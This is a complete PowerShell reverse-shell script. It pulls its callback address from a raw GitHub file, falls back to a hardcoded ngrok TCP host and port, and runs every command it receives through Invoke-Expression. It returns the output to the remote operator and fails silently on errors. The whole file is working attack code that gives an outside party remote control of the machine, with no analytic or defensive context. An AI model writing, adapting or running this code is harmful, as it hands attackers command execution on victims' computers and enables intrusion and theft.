# GitHub Dynamic Reverse Shell
$github_url = "https://raw.githubusercontent.com/Hacker0101010101010/ngrok-control/main/current.txt"

try {
    $address = (Invoke-WebRequest -Uri $github_url -UseBasicParsing -TimeoutSec 5).Content.Trim()
    if (-not ($address -match '^[^:]+:\d+$')) {
        $address = "2.tcp.eu.ngrok.io:19762"
    }
} catch {
    $address = "2.tcp.eu.ngrok.io:19762"
}

$hostname,$port = $address -split ':'

try {
    $client = New-Object System.Net.Sockets.TCPClient($hostname,[int]$port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = ([text.encoding]::ASCII).GetString($bytes,0, $i)
        $sendback = (iex $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    # Silent fail
}
